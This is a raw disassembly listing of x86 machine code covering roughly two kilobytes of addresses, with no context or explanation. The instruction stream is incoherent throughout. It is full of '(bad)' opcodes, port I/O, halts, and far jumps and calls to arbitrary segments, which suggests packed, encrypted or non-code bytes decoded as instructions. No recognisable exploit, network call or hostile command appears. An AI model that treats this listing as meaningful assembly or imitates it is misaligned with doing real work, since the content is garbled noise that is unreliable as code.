  4224ea:	mov    WORD PTR [esi-0x54],ss
  4224ed:	push   esi
  4224ee:	es popa 
  4224f0:	push   esi
  4224f1:	mov    esi,0x367ec0c8
  4224f6:	xor    BYTE PTR [ebx],ah
  4224f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224f9:	pop    ecx
  4224fa:	jno    0x4224a8
  4224fc:	in     eax,dx
  4224fd:	loope  0x42257d
  4224ff:	inc    BYTE PTR [ebx+eiz*4]
  422502:	ffree  st(6)
  422504:	(bad)  
  422505:	test   BYTE PTR [eax+eiz*4+0x55b02b8e],0xc4
  42250d:	jmp    0x85e2:0xb04ca6b2
  422514:	popa   
  422515:	aas    
  422516:	add    al,0xde
  422518:	fimul  DWORD PTR [esi+0x70]
  42251b:	(bad)
  422520:	or     al,0xdc
  422522:	mov    ebx,0x2fb5aa4e
  422527:	test   BYTE PTR [eax+0x202ae0f1],dl
  42252d:	inc    esp
  42252e:	adc    edi,DWORD PTR [edi]
  422530:	xchg   esi,eax
  422531:	or     eax,0xaaaab14
  422536:	out    0xd,eax
  422538:	adc    eax,0x984d7b3b
  42253d:	ror    ebx,cl
  42253f:	repz add BYTE PTR [ecx+0x73],0x8c
  422544:	mov    al,ds:0x4b019ff4
  422549:	sub    edi,edi
  42254b:	in     al,0xce
  42254d:	jnp    0x4224e5
  42254f:	mov    esp,DWORD PTR [eax-0x73]
  422552:	mov    bl,0x26
  422554:	out    0x5c,al
  422556:	inc    ecx
  422557:	cmp    edx,DWORD PTR [eax+ecx*1]
  42255a:	and    BYTE PTR [esi+0x57],cl
  42255d:	test   DWORD PTR [edx-0x6],eax
  422560:	mov    WORD PTR [eax-0x1c14afd7],ss
  422566:	inc    esp
  422567:	les    esp,FWORD PTR [edi+0x7713dd57]
  42256d:	push   ebx
  42256e:	ror    BYTE PTR [ebx],0x30
  422571:	cmp    al,BYTE PTR [edx-0x3]
  422574:	jb     0x42254a
  422576:	add    eax,0xae423128
  42257b:	fst    DWORD PTR [eax+0x67]
  42257e:	inc    esi
  42257f:	xchg   DWORD PTR [edx-0x6f],eax
  422582:	and    dh,BYTE PTR [ebx]
  422584:	leave  
  422585:	sub    eax,DWORD PTR [edx-0x70]
  422588:	gs and dh,0xe2
  42258c:	sub    edi,DWORD PTR [esi-0x6360989d]
  422592:	mov    dh,0xda
  422594:	leave  
  422595:	call   0x59e4:0x50d0e9c5
  42259c:	not    BYTE PTR [esi]
  42259e:	mov    edx,0xa78c1a1b
  4225a3:	push   edi
  4225a4:	in     eax,dx
  4225a5:	sub    eax,0x17683efe
  4225aa:	ins    BYTE PTR es:[edi],dx
  4225ab:	sbb    ch,BYTE PTR [edi]
  4225ad:	and    al,0x44
  4225af:	les    edx,FWORD PTR [ecx+0x8]
  4225b2:	lds    esp,FWORD PTR [esi]
  4225b4:	sbb    al,0xfb
  4225b6:	in     al,0x96
  4225b8:	hlt    
  4225b9:	push   ss
  4225ba:	xchg   esi,eax
  4225bb:	and    edx,DWORD PTR [edi]
  4225bd:	loope  0x4225d9
  4225bf:	inc    ebx
  4225c0:	loopne 0x42258a
  4225c2:	fild   WORD PTR [ecx+eax*8-0x488ba107]
  4225c9:	ja     0x4225bb
  4225cb:	addr16 pop es
  4225cd:	ret    0xf39c
  4225d0:	(bad)
  4225d3:	dec    esi
  4225d4:	push   0xffffffdd
  4225d6:	push   ss
  4225d7:	mov    BYTE PTR [ebp*2-0x97d9144],ch
  4225de:	cld    
  4225df:	(bad)  
  4225e0:	mov    esp,0x378fc3b1
  4225e5:	inc    ebp
  4225e6:	dec    ebx
  4225e7:	mov    ecx,0x4730082d
  4225ec:	pop    esp
  4225ed:	mov    esp,0x7f1bd29d
  4225f2:	es addr16 into 
  4225f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f6:	jb     0x4225b5
  4225f8:	aas    
  4225f9:	jmp    0x422595
  4225fb:	push   0x7e591602
  422600:	in     al,0xd
  422602:	hlt    
  422603:	sub    al,0xc1
  422605:	repnz mov ah,0x59
  422608:	mov    esp,0x982b607a
  42260d:	rcl    DWORD PTR [ecx+0x3b],1
  422610:	loop   0x42259c
  422612:	add    eax,0x84230cfd
  422617:	fdivr  DWORD PTR [edx]
  422619:	ds mov fs:0xaa91d3e6,eax
  422620:	test   al,0x1e
  422622:	mov    edx,esi
  422624:	inc    edi
  422625:	stos   DWORD PTR es:[edi],eax
  422626:	and    bh,BYTE PTR [esi]
  422628:	out    0xb2,al
  42262a:	js     0x422616
  42262c:	(bad)  
  42262d:	push   ebx
  42262e:	push   ds
  42262f:	call   0x36947e9d
  422634:	pusha  
  422635:	cmp    ecx,DWORD PTR [ebp-0x13]
  422638:	mov    cl,0xdd
  42263a:	call   0x62ee:0x575b472d
  422641:	mov    ch,0xed
  422643:	mov    edi,esp
  422645:	dec    ebx
  422646:	pop    esi
  422647:	cmp    al,0xc1
  422649:	cmp    DWORD PTR [ecx+0x7b4e959e],0x49
  422650:	ss pop ebx
  422652:	outs   dx,BYTE PTR ds:[esi]
  422653:	(bad)  
  422654:	lods   eax,DWORD PTR ds:[esi]
  422655:	out    dx,al
  422656:	xchg   ebp,eax
  422657:	mov    ah,0x4d
  422659:	std    
  42265a:	inc    edi
  42265b:	repnz adc ebx,DWORD PTR [esi]
  42265e:	xchg   ebx,eax
  42265f:	scas   al,BYTE PTR es:[edi]
  422660:	stos   BYTE PTR es:[edi],al
  422661:	fnsave [edi+eax*4]
  422664:	push   edx
  422665:	dec    ecx
  422666:	mov    ecx,0x1c90ec38
  42266b:	into   
  42266c:	pop    ss
  42266d:	add    eax,0x96595a
  422672:	lea    esp,[edi+0xa]
  422675:	add    ecx,0x6c
  422678:	jecxz  0x422632
  42267a:	mov    ecx,DWORD PTR [esi-0x2930bb61]
  422680:	add    BYTE PTR [edi],bl
  422682:	add    BYTE PTR [ebp-0x571abbc7],ah
  422688:	in     eax,dx
  422689:	jno    0x42264f
  42268b:	arpl   WORD PTR [ebp+0x12649a8a],bp
  422691:	push   edx
  422692:	or     cl,BYTE PTR [ebx+0x2dcbcd61]
  422698:	test   DWORD PTR [edx+0x77ac1514],0x20c29404
  4226a2:	loop   0x422667
  4226a4:	push   edx
  4226a5:	jnp    0x422688
  4226a7:	xchg   edi,eax
  4226a8:	sbb    al,BYTE PTR [eax]
  4226aa:	cld    
  4226ab:	adc    al,0x1d
  4226ad:	lea    ecx,[esi]
  4226af:	mov    edi,ss
  4226b1:	out    0xf3,al
  4226b3:	push   esp
  4226b4:	aad    0xbd
  4226b6:	xchg   esi,eax
  4226b7:	xor    al,0xa0
  4226b9:	sub    esi,ebp
  4226bb:	and    BYTE PTR [esi],0x1c
  4226be:	ficomp DWORD PTR [eax-0x66]
  4226c1:	add    al,0x6d
  4226c3:	sub    BYTE PTR [edx],al
  4226c5:	or     al,0xc0
  4226c7:	ja     0x422657
  4226c9:	js     0x4226ad
  4226cb:	ins    BYTE PTR es:[edi],dx
  4226cc:	rcl    DWORD PTR [ebx-0x1f],0x4e
  4226d0:	adc    BYTE PTR [ecx],0x8d
  4226d3:	fcomp  st(6)
  4226d5:	and    BYTE PTR [edi+edx*1-0x79],ch
  4226d9:	(bad)  
  4226da:	daa    
  4226db:	jns    0x42266b
  4226dd:	ja     0x422665
  4226df:	inc    ecx
  4226e0:	lea    eax,[ebx+0x63e77c17]
  4226e6:	inc    esi
  4226e7:	(bad)  
  4226e8:	dec    eax
  4226e9:	mov    BYTE PTR [ebx-0x13],ch
  4226ec:	xchg   esi,eax
  4226ed:	bnd jb 0x422716
  4226f0:	jns    0x42270e
  4226f2:	repnz cmp edi,ebx
  4226f5:	in     eax,dx
  4226f6:	fisub  DWORD PTR [ebx-0x11]
  4226f9:	or     DWORD PTR [esi],edi
  4226fb:	push   edi
  4226fc:	inc    esi
  4226fd:	es add eax,0x6e74df32
  422703:	xchg   ebx,eax
  422704:	pop    esp
  422705:	add    DWORD PTR [edi+0x627df7e9],esi
  42270b:	ja     0x4226e1
  42270d:	and    bl,BYTE PTR [esi]
  42270f:	and    BYTE PTR [ebx],cl
  422711:	std    
  422712:	clc    
  422713:	out    0xe,eax
  422715:	or     eax,0x8a5733fb
  42271a:	mov    eax,ds:0xb0056701
  42271f:	cmp    al,0x7c
  422721:	push   edi
  422722:	hlt    
  422723:	ret    0xc046
  422726:	mov    ebx,0x133f94b0
  42272b:	jle    0x422786
  42272d:	(bad)  
  42272e:	jge    0x42278e
  422730:	jecxz  0x42273d
  422732:	(bad)  
  422733:	push   0x441c37d2
  422738:	push   cs
  422739:	and    bl,ch
  42273b:	out    dx,al
  42273c:	dec    ebp
  42273d:	add    al,0x4f
  42273f:	jae    0x422740
  422741:	out    dx,eax
  422742:	addr16 test eax,0x426dec3b
  422748:	xor    edi,esi
  42274a:	ja     0x42278d
  42274c:	pop    esp
  42274d:	mov    DWORD PTR [edx+0x298455ad],esi
  422753:	and    BYTE PTR [edx],bh
  422755:	stc    
  422756:	hlt    
  422757:	xchg   edx,eax
  422758:	sahf   
  422759:	adc    eax,0x9693dc7c
  42275e:	adc    BYTE PTR [eax+0x496de639],dh
  422764:	xlat   BYTE PTR gs:[ebx]
  422766:	pavgw  mm1,QWORD PTR [esi]
  422769:	add    ebp,DWORD PTR [ebx+0x79]
  42276c:	push   ss
  42276d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42276e:	rcr    DWORD PTR [edi],cl
  422770:	clc    
  422771:	mov    esp,esp
  422773:	gs test eax,0xa28c717c
  422779:	push   ecx
  42277a:	fld    DWORD PTR [eax+0x59]
  42277d:	sbb    al,0x28
  42277f:	pop    eax
  422780:	ss iret 
  422782:	push   edx
  422783:	xor    DWORD PTR [edx-0x5e388d51],edi
  422789:	mov    ah,0xab
  42278b:	mov    ebp,0x4bbe5309
  422790:	dec    ecx
  422791:	(bad)  
  422792:	sbb    bl,BYTE PTR [edx-0x62]
  422795:	jbe    0x422810
  422797:	dec    esi
  422798:	push   ecx
  422799:	addr16 loopne 0x422812
  42279c:	sbb    al,0xc6
  42279e:	push   ds
  42279f:	sar    esi,cl
  4227a1:	xchg   ebp,eax
  4227a2:	aaa    
  4227a3:	jne    0x422798
  4227a5:	aad    0x99
  4227a7:	push   cs
  4227a8:	shl    BYTE PTR es:[edi+eax*1],cl
  4227ac:	mov    al,ds:0x5245f111
  4227b1:	add    ah,cl
  4227b3:	out    0xdf,al
  4227b5:	sbb    BYTE PTR [edi],bl
  4227b7:	or     al,0x77
  4227b9:	out    0x44,eax
  4227bb:	aaa    
  4227bc:	pop    esi
  4227bd:	mov    ebp,ds
  4227bf:	adc    bh,bh
  4227c1:	mov    dh,0xf6
  4227c3:	mov    ebx,0x56e87d12
  4227c8:	xor    DWORD PTR [ecx],0xfaeec970
  4227ce:	mov    dh,0xef
  4227d0:	ins    DWORD PTR es:[edi],dx
  4227d1:	sahf   
  4227d2:	inc    esi
  4227d3:	outs   dx,BYTE PTR ds:[esi]
  4227d4:	or     cl,BYTE PTR [edi+0x9d5331a]
  4227da:	nop
  4227db:	(bad)  
  4227dc:	ret    0x1b10
  4227df:	push   edx
  4227e0:	mov    ss,WORD PTR [edi+0x46944e9a]
  4227e6:	jo     0x422858
  4227e8:	jo     0x422792
  4227ea:	pop    es
  4227eb:	stos   DWORD PTR es:[edi],eax
  4227ec:	lock cld 
  4227ee:	nop
  4227ef:	fisttp WORD PTR [ebx-0x16]
  4227f2:	xor    eax,DWORD PTR [ecx]
  4227f4:	fdiv   st(1),st
  4227f6:	pop    ss
  4227f7:	cmp    DWORD PTR [edi],eax
  4227f9:	ficom  WORD PTR [esi]
  4227fb:	or     DWORD PTR [edx+esi*4+0x67d3857],ecx
  422802:	outs   dx,BYTE PTR ds:[esi]
  422803:	add    al,0xdd
  422805:	pop    ss
  422806:	ss retf 
  422808:	sbb    esi,DWORD PTR [edx]
  42280a:	mov    BYTE PTR [ecx-0x227f83c2],dl
  422810:	or     edi,esp
  422812:	or     BYTE PTR [edx],bh
  422814:	inc    edi
  422815:	(bad)  
  422816:	mov    edi,0xa5806fc4
  42281b:	neg    DWORD PTR [esi-0x5f678e66]
  422821:	push   cs
  422822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422823:	mov    ds:0xe66ee6a,eax
  422828:	cwde   
  422829:	mov    bl,0x28
  42282b:	lods   al,BYTE PTR ds:[esi]
  42282c:	mov    bh,0x82
  42282e:	fmul   st(2),st
  422830:	shl    DWORD PTR [esi+eiz*8],cl
  422833:	mov    eax,ds:0x71cf6dfa
  422838:	mov    esp,0x295763bd
  42283d:	in     eax,0x19
  42283f:	sahf   
  422840:	mov    dh,0x65
  422842:	dec    edx
  422843:	mov    ebp,0x12620ebe
  422848:	jecxz  0x422837
  42284a:	mov    ds:0x61372fbf,eax
  42284f:	xor    dh,BYTE PTR [ecx-0x2d0ec27b]
  422855:	aad    0xc5
  422857:	fbld   TBYTE PTR [eax+0x1a755b0f]
  42285d:	mov    esi,0x20226e64
  422862:	jl     0x4228e1
  422864:	sub    bh,cl
  422866:	cmp    edx,DWORD PTR [esi+0x44]
  422869:	rol    DWORD PTR [edx],cl
  42286b:	retf   
  42286c:	sbb    edi,DWORD PTR [edi]
  42286e:	xchg   edx,eax
  42286f:	loop   0x42289a
  422871:	adc    eax,0x5f46650f
  422876:	inc    ebp
  422877:	adc    al,0xa1
  422879:	and    esi,DWORD PTR [esp+ebx*4]
  42287c:	pop    ss
  42287d:	call   0x438323fd
  422882:	jmp    0x4228f5
  422884:	pop    esi
  422885:	sub    DWORD PTR [edx+edi*4],edi
  422888:	loope  0x422866
  42288a:	and    BYTE PTR [ebp+0x75],dl
  42288d:	(bad)  
  42288e:	je     0x42288b
  422890:	jecxz  0x422875
  422892:	in     al,dx
  422893:	out    0xa4,al
  422895:	sub    BYTE PTR [ebp+0x31],ch
  422898:	es add eax,0x8f77485c
  42289e:	jnp    0x422903
  4228a0:	add    eax,0x5ae5104a
  4228a5:	ja     0x42288c
  4228a7:	xchg   edi,eax
  4228a8:	sub    DWORD PTR [eax-0x72],edi
  4228ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ac:	(bad)  
  4228ad:	nop
  4228ae:	imul   BYTE PTR [eax-0x25]
  4228b1:	idiv   BYTE PTR [edi-0x34]
  4228b4:	inc    ecx
  4228b5:	daa    
  4228b6:	mov    dh,BYTE PTR [edx]
  4228b8:	les    esp,FWORD PTR [eax-0x25437414]
  4228be:	loopne 0x42284d
  4228c0:	mov    esp,0x5fdabff2
  4228c5:	fisubr WORD PTR [ecx+0x29fe5327]
  4228cb:	add    al,0x43
  4228cd:	jle    0x42287d
  4228cf:	outs   dx,BYTE PTR ds:[esi]
  4228d0:	je     0x42288c
  4228d2:	loopne 0x422934
  4228d4:	mov    ebx,0x7c7a0b3a
  4228d9:	push   es
  4228da:	call   0x3ba1f240
  4228df:	into   
  4228e0:	dec    edi
  4228e1:	lea    esi,[edx-0x601cc9df]
  4228e7:	out    dx,al
  4228e8:	aaa    
  4228e9:	push   esp
  4228ea:	lods   al,BYTE PTR ds:[esi]
  4228eb:	jbe    0x4228d4
  4228ed:	bound  ebp,QWORD PTR [ebp-0x380a7119]
  4228f3:	out    0x9d,eax
  4228f5:	ja     0x4228c7
  4228f7:	push   0xffffffa5
  4228f9:	clc    
  4228fa:	xor    ch,bh
  4228fc:	push   0x4530e3ea
  422901:	lods   eax,DWORD PTR ds:[esi]
  422902:	mov    esi,0xfeb027c6
  422907:	leave  
  422908:	and    DWORD PTR [edi-0x5262a5be],eax
  42290e:	test   DWORD PTR [ecx],eax
  422910:	iret   
  422911:	inc    edx
  422912:	mov    ah,0xa1
  422914:	and    eax,0xe97fdf43
  422919:	scas   eax,DWORD PTR es:[edi]
  42291a:	jns    0x4228ba
  42291c:	xlat   BYTE PTR ds:[ebx]
  42291d:	add    bh,BYTE PTR [eax-0x3a9e46c4]
  422923:	out    dx,eax
  422924:	mov    WORD PTR [esi+0x2efc63fa],fs
  42292a:	xor    DWORD PTR [esi],ebp
  42292c:	or     DWORD PTR [ebp+0x5665f7c0],ecx
  422932:	xchg   esp,eax
  422933:	test   cl,al
  422935:	mov    ebx,0x7d6eb7c1
  42293a:	dec    esp
  42293b:	pop    ebx
  42293c:	shl    DWORD PTR [eax+ecx*8-0x4ecc8cff],1
  422943:	(bad)  
  422944:	mov    DWORD PTR [si-0x4262],edx
  422949:	jne    0x4228e9
  42294b:	xor    dl,BYTE PTR [edx-0x66e532f3]
  422951:	xlat   BYTE PTR ds:[ebx]
  422952:	sub    ch,BYTE PTR [esp+eiz*2]
  422955:	fild   DWORD PTR [eax-0x10]
  422958:	mov    edi,0x40377aa7
  42295d:	sub    eax,0x51f901ed
  422962:	leave  
  422963:	fmul   QWORD PTR [ebp-0x3b912795]
  422969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42296a:	lds    ebx,FWORD PTR [esi]
  42296c:	sub    dl,0x92
  42296f:	test   al,0x28
  422971:	aaa    
  422972:	jo     0x4229ee
  422974:	daa    
  422975:	(bad)  
  422976:	xlat   BYTE PTR ds:[ebx]
  422977:	dec    esi
  422978:	lods   al,BYTE PTR ds:[esi]
  422979:	je     0x422988
  42297b:	add    al,0x18
  42297d:	icebp  
  42297e:	fiadd  WORD PTR [edi-0x66]
  422981:	cmp    eax,0x35cda5b7
  422986:	mov    esi,0x326fbaaf
  42298b:	xchg   ecx,eax
  42298c:	hlt    
  42298d:	test   BYTE PTR [ecx],dl
  42298f:	retf   0x200d
  422992:	and    eax,0x2947e4c8
  422997:	jecxz  0x422932
  422999:	lds    ebx,FWORD PTR [esi-0xd78df4c]
  42299f:	jecxz  0x42299f
  4229a1:	mov    ecx,DWORD PTR ss:[ecx-0x23bc59d0]
  4229a8:	or     eax,0xec91c5e8
  4229ad:	xor    eax,0x55cd081b
  4229b2:	mov    BYTE PTR [edx-0x38],0xc9
  4229b6:	jle    0x4229d6
  4229b8:	or     BYTE PTR [eax+0x2b],ah
  4229bb:	and    al,0x3d
  4229bd:	xchg   ebx,eax
  4229be:	cdq    
  4229bf:	out    dx,al
  4229c0:	neg    BYTE PTR fs:[ecx+0x155daf46]
  4229c7:	dec    ecx
  4229c8:	xor    dl,al
  4229ca:	ret    0x2148
  4229cd:	mov    dh,0x40
  4229cf:	ds add esp,edx
  4229d2:	jle    0x3e9b878f
  4229d8:	rol    BYTE PTR [edx+0x63],cl
  4229db:	pop    ebx
  4229dc:	jno    0x4229fb
  4229de:	leave  
  4229df:	rcl    esi,cl
  4229e1:	mov    esp,0x503d1843
  4229e6:	cmc    
  4229e7:	test   DWORD PTR [ecx-0x450e5268],edi
  4229ed:	sub    edx,ebx
  4229ef:	add    ah,ah
  4229f1:	retf   
  4229f2:	adc    BYTE PTR [edx+eiz*8+0x34],al
  4229f6:	mov    bl,dl
  4229f8:	call   0x22057d7
  4229fd:	jae    0x4229f5
  4229ff:	add    eax,0x7993a0e4
  422a04:	neg    BYTE PTR [esi+0x820a1f1]
  422a0a:	fld    st(1)
  422a0c:	dec    edi
  422a0d:	jbe    0x4229e4
  422a0f:	in     eax,0x28
  422a11:	lods   eax,DWORD PTR ds:[esi]
  422a12:	xchg   DWORD PTR [eax],ebx
  422a14:	repnz fwait
  422a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a17:	adc    ah,dl
  422a19:	or     bl,BYTE PTR [eax]
  422a1b:	xchg   esp,eax
  422a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a1d:	cmp    al,0x6c
  422a1f:	or     BYTE PTR [edi-0x58],bl
  422a22:	aam    0x8e
  422a24:	test   BYTE PTR [ebp-0x279b593e],ah
  422a2a:	mov    al,ds:0x7f4a32fd
  422a2f:	loope  0x422a8d
  422a31:	push   es
  422a32:	fwait
  422a33:	(bad)  
  422a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a35:	or     ah,ah
  422a37:	outs   dx,BYTE PTR ds:[esi]
  422a38:	mov    eax,ds:0xd4c7f72a
  422a3d:	loopne 0x422aab
  422a3f:	cmp    DWORD PTR [edx+0x33aa87c0],edx
  422a45:	dec    ebp
  422a46:	popa   
  422a47:	pop    ss
  422a48:	test   eax,0x4ccc8c0a
  422a4d:	stc    
  422a4e:	mov    al,0x35
  422a50:	(bad)  
  422a51:	jmp    0x8eb9:0xdbfc1c2
  422a58:	(bad)  
  422a59:	adc    DWORD PTR [edi],eax
  422a5b:	clc    
  422a5c:	rol    DWORD PTR [edx],0xc0
  422a5f:	ins    BYTE PTR es:[edi],dx
  422a60:	sbb    eax,0xa4d0dc57
  422a65:	xor    al,0xfb
  422a67:	or     bl,BYTE PTR [edi-0x53]
  422a6a:	sub    esi,DWORD PTR [ebx-0xc]
  422a6d:	mov    dh,bh
  422a6f:	fisubr DWORD PTR [ebx]
  422a71:	int    0x38
  422a73:	mov    ebx,0xe91a140c
  422a78:	das    
  422a79:	test   eax,0x72c632da
  422a7e:	ror    BYTE PTR [ebp+0x3671d384],cl
  422a84:	jge    0x422a14
  422a86:	in     eax,dx
  422a87:	push   ebp
  422a88:	arpl   bp,bx
  422a8a:	loopne 0x422ac1
  422a8c:	out    dx,al
  422a8d:	repnz (bad) 
  422a8f:	push   0x2c
  422a91:	xchg   edi,eax
  422a92:	jno    0x422a36
  422a94:	into   
  422a95:	das    
  422a96:	jne    0x422a2c
  422a98:	sbb    edx,DWORD PTR [edi+0x5756ab44]
  422a9e:	xor    eax,0xffe21858
  422aa3:	dec    ebp
  422aa4:	dec    edi
  422aa5:	sbb    BYTE PTR [ecx-0x19],bh
  422aa8:	inc    esi
  422aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aaa:	mov    dh,BYTE PTR [ecx+0x77]
  422aad:	inc    edx
  422aae:	jno    0x422aa0
  422ab0:	pop    ecx
  422ab1:	lea    esi,[edx+0x7e8242b8]
  422ab7:	jecxz  0x422ae4
  422ab9:	mov    esp,0xea30c776
  422abe:	out    0xb0,al
  422ac0:	inc    edx
  422ac1:	mov    WORD PTR [edx+eax*1],ss
  422ac4:	mov    dh,0xfa
  422ac6:	gs pop edi
  422ac8:	cdq    
  422ac9:	popf   
  422aca:	jo     0x422a7b
  422acc:	add    al,0xee
  422ace:	out    dx,al
  422acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ad0:	into   
  422ad1:	cmp    edi,esp
  422ad3:	ins    DWORD PTR es:[edi],dx
  422ad4:	push   ebp
  422ad5:	xchg   ebp,eax
  422ad6:	mov    ebx,0x67dc1f09
  422adb:	add    eax,DWORD PTR [ebx+0x582dc16c]
  422ae1:	pop    esi
  422ae2:	(bad)  
  422ae3:	pop    esi
  422ae4:	sar    BYTE PTR ds:0xca0fa091,cl
  422aea:	add    ebx,DWORD PTR [ebx+eax*1]
  422aed:	mov    edi,0x361969ed
  422af2:	test   bh,al
  422af4:	pop    edi
  422af5:	das    
  422af6:	int3   
  422af7:	ins    DWORD PTR es:[edi],dx
  422af8:	adc    eax,ecx
  422afa:	in     al,0x17
  422afc:	daa    
  422afd:	jle    0x422ac8
  422aff:	cld    
  422b00:	pop    esi
  422b01:	mov    bh,0xc
  422b03:	mov    edi,0x46004ae8
  422b08:	int3   
  422b09:	or     eax,0xe53ae5f7
  422b0e:	and    eax,0x47e91937
  422b13:	pop    esi
  422b14:	sub    BYTE PTR [ecx-0x50],dl
  422b17:	mov    al,ds:0x2a20d63e
  422b1c:	push   ebx
  422b1d:	push   ds
  422b1e:	inc    edi
  422b1f:	xor    eax,0xdecd76a9
  422b24:	mov    DWORD PTR [ecx+eax*1],eax
  422b27:	es test eax,0xa53a9d54
  422b2d:	sti    
  422b2e:	xor    ebx,edi
  422b30:	das    
  422b31:	cmp    dl,dh
  422b33:	loopne 0x422b0d
  422b35:	pop    edx
  422b36:	sar    BYTE PTR [ebx-0x21],0xbe
  422b3a:	fs or  eax,0xc65e2d06
  422b40:	retf   0x8005
  422b43:	sahf   
  422b44:	call   0x48217f92
  422b49:	rcl    al,cl
  422b4b:	mov    esp,0x6a65c81d
  422b50:	lods   al,BYTE PTR ds:[esi]
  422b51:	sbb    DWORD PTR [edx+0x3d],ebx
  422b54:	or     al,0x4c
  422b56:	mov    ecx,0x21154477
  422b5b:	fwait
  422b5c:	inc    esi
  422b5d:	es xchg ecx,eax
  422b5f:	jmp    0x1ce4:0x39c57e8
  422b66:	or     edi,DWORD PTR ds:[edx-0x1f20bcb0]
  422b6d:	fs nop
  422b6f:	mov    al,ds:0x327c7047
  422b74:	lock lods al,BYTE PTR ds:[esi]
  422b76:	stos   BYTE PTR es:[edi],al
  422b77:	adc    BYTE PTR [edx],cl
  422b79:	repnz repnz pop ebp
  422b7c:	jae    0x422bfb
  422b7e:	inc    esp
  422b7f:	gs jge 0x422b43
  422b82:	jb     0x422b7f
  422b84:	push   es
  422b85:	cmp    ch,ah
  422b87:	test   eax,0x7770d35c
  422b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b8d:	jbe    0x422b57
  422b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b90:	xchg   ecx,eax
  422b91:	add    ch,0xf0
  422b94:	dec    esp
  422b95:	and    esi,ebx
  422b97:	adc    ch,BYTE PTR [esi]
  422b99:	stos   BYTE PTR es:[edi],al
  422b9a:	aas    
  422b9b:	mov    al,ds:0x21c37d12
  422ba0:	xor    BYTE PTR [esi+0x59],dh
  422ba3:	rol    DWORD PTR [ebx-0x4e10159],0xeb
  422baa:	cld    
  422bab:	mov    ds:0x9469bb7a,al
  422bb0:	scas   eax,DWORD PTR es:[edi]
  422bb1:	fisub  WORD PTR [eax]
  422bb3:	pop    ds
  422bb4:	adc    edx,eax
  422bb6:	int3   
  422bb7:	adc    ah,ah
  422bb9:	xchg   ebp,eax
  422bba:	pop    es
  422bbb:	lds    esi,FWORD PTR [edi-0x69]
  422bbe:	scas   al,BYTE PTR es:[edi]
  422bbf:	xchg   edx,eax
  422bc0:	jmp    0x6955:0xac3c077b
  422bc7:	pushf  
  422bc8:	out    dx,eax
  422bc9:	cmp    eax,0xf27090b5
  422bce:	mov    ch,0x54
  422bd0:	jle    0x422bec
  422bd2:	clc    
  422bd3:	leave  
  422bd4:	push   ss
  422bd5:	js     0x422bc7
  422bd7:	je     0x422c51
  422bd9:	cwde   
  422bda:	push   edi
  422bdb:	iret   
  422bdc:	cld    
  422bdd:	mov    ecx,0xebf93c7d
  422be2:	iret   
  422be3:	mov    ds:0x4712e61b,al
  422be8:	mov    gs,WORD PTR [ebp+0xc5205e6]
  422bee:	fisubr DWORD PTR [ebx+0x6]
  422bf1:	mov    dh,0xd3
  422bf3:	add    DWORD PTR [esi-0x2b490cc9],0xffffff85
  422bfa:	xchg   edx,eax
  422bfb:	jns    0x422bb9
  422bfd:	icebp  
  422bfe:	add    BYTE PTR [ebx-0x5d949b89],0x27
  422c05:	and    BYTE PTR [ebx+ecx*1+0x8273d0a],al
  422c0c:	ret    0xda99
  422c0f:	cmp    DWORD PTR [eax-0x5a],0x4d76e2fa
  422c16:	xor    cl,0x32
  422c19:	dec    edx
  422c1a:	test   DWORD PTR [edx+0x5c],ebx
  422c1d:	test   esi,ecx
  422c1f:	(bad)  
  422c20:	xor    esi,0xffffffa2
  422c23:	pop    ecx
  422c24:	mov    edx,0xa95dd437
  422c29:	ror    cl,0xcc
  422c2c:	fld    DWORD PTR gs:[esi+0x15985dc7]
  422c33:	neg    DWORD PTR [ecx+0x7e8261f7]
  422c39:	mov    edi,0xf1addcd7
  422c3e:	pop    ss
  422c3f:	cs push ebp
  422c41:	test   BYTE PTR [ecx+eiz*2],ch
  422c44:	shl    DWORD PTR [edx-0x3342a951],cl
  422c4a:	clc    
  422c4b:	jp     0x422c50
  422c4d:	cs sub al,0x79
  422c50:	daa    
  422c51:	iret   
  422c52:	and    ah,BYTE PTR [ebx+0x54e8796d]
  422c58:	xor    dl,BYTE PTR [ecx+0x582dd98c]
  422c5e:	cmc    
  422c5f:	sub    al,0x5d
  422c61:	mov    ecx,edx
  422c63:	xchg   BYTE PTR [esi+ecx*4+0x10219cce],cl
  422c6a:	scas   eax,DWORD PTR es:[edi]
  422c6b:	add    DWORD PTR [edi],esi
  422c6d:	and    eax,0xa8966cda
  422c72:	add    BYTE PTR [ebx+0x77da9b14],ch
  422c78:	pop    edi
  422c79:	repz out dx,al
  422c7b:	adc    al,0x4b
  422c7d:	les    edx,FWORD PTR [eax+ebp*8]
  422c80:	test   al,0x43
  422c82:	adc    al,BYTE PTR [eax+0x3eee37c2]
  422c88:	xor    bh,bl
  422c8a:	push   0xddd5e93e
  422c8f:	inc    ecx
  422c90:	xor    bl,BYTE PTR [edi-0x3a92ca2d]
  422c96:	sbb    BYTE PTR [eax+ebp*4-0x5b],ah
  422c9a:	sub    esi,DWORD PTR [ebx+0x32135627]
  422ca0:	out    dx,al
  422ca1:	cmp    al,0x16
  422ca3:	fild   QWORD PTR [ebx]
  422ca5:	aad    0xc7
  422ca7:	adc    ch,bh
  422ca9:	add    ah,BYTE PTR [ebx*4+0x1baa226b]
  422cb0:	or     BYTE PTR [esi+0x54],ch
  422cb3:	pop    eax
  422cb4:	(bad)  ds:0x786575cc
  422cba:	jb     0x422cbe
  422cbc:	test   BYTE PTR [esi+0x25469942],al
  422cc2:	cmp    edi,ebp
  422cc4:	repz jmp 0x422cbf
  422cc7:	dec    ecx
  422cc8:	ror    BYTE PTR [edx+0x59],0x53
  422ccc:	sbb    edi,DWORD PTR [ecx]
  422cce:	cmp    bh,bl
  422cd0:	fisttp DWORD PTR [edx]
  422cd2:	adc    ecx,ebx
